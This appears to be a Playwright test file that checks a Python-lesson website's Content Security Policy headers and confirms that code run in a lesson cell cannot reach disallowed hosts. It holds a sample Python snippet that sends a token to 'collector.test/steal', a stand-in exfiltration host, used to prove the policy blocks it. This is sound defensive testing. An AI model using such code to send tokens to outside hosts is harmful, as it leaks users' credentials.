import { expect, test, type Page } from '@playwright/test';

const VIOLATION = /content security policy|refused to/i;

async function watchViolations(page: Page): Promise<string[]> {
  const seen: string[] = [];
  page.on('console', (msg) => {
    if (VIOLATION.test(msg.text())) seen.push(msg.text());
  });
  await page.addInitScript(() => {
    document.addEventListener('securitypolicyviolation', (event) => {
      console.error(`Refused to load ${event.blockedURI} (${event.violatedDirective})`);
    });
  });
  return seen;
}

test('the smoke suite runs with the policy enforced, so a blocked source breaks a test', async ({
  request,
}) => {
  const headers = (await request.get('/lessons/functions')).headers();
  expect(headers['content-security-policy']).toContain("default-src 'self'");
  expect(headers['content-security-policy-report-only']).toBeUndefined();
  expect(headers['x-content-type-options']).toBe('nosniff');
  expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
});

test('the home, course, account, lesson and project pages raise no policy violation', async ({
  page,
}) => {
  const violations = await watchViolations(page);
  for (const path of [
    '/',
    '/courses/python',
    '/account',
    '/lessons/functions',
    '/lessons/first-python-file',
  ]) {
    await page.goto(path);
    await page.waitForLoadState('networkidle');
  }
  expect(violations).toEqual([]);
});

test('a violation in the page is reported, so the check above can fail', async ({ page }) => {
  const violations = await watchViolations(page);
  await page.goto('/');
  await page.evaluate(() => {
    const image = new Image();
    image.src = 'https://example.invalid/blocked.png';
    document.body.append(image);
  });
  await expect.poll(() => violations.length).toBeGreaterThan(0);
});

const SENDING_CODE = [
  'from pyodide.http import open_url',
  'for url in ["https://collector.test/steal?token=abc", "https://identitytoolkit.googleapis.com/probe"]:',
  '    try:',
  '        open_url(url)',
  '        print("sent", url)',
  '    except BaseException:',
  '        print("failed", url)',
].join('\n');

test('code in a cell cannot send data to a server the policy does not allow', async ({
  page,
  context,
}) => {
  const reached: string[] = [];
  await context.route(/collector\.test|identitytoolkit\.googleapis\.com/, (route) => {
    reached.push(new URL(route.request().url()).hostname);
    return route.fulfill({
      status: 200,
      headers: { 'access-control-allow-origin': '*' },
      body: '',
    });
  });
  await page.goto('/lessons/functions');
  const cell = page.locator('[data-cell-id="sum-three-try"]');
  await expect(cell.locator('button.run')).toBeEnabled({ timeout: 45_000 });
  await cell.locator('textarea').fill(SENDING_CODE);
  await cell.locator('button.run').click();
  await expect(cell.locator('.output')).toContainText('identitytoolkit.googleapis.com/probe');

  expect(reached, 'an allowed host is reached, so worker requests can be seen').toContain(
    'identitytoolkit.googleapis.com',
  );
  expect(reached, 'a host outside the policy is never reached').not.toContain('collector.test');
  await expect(cell.locator('.output')).toContainText('failed https://collector.test');
});
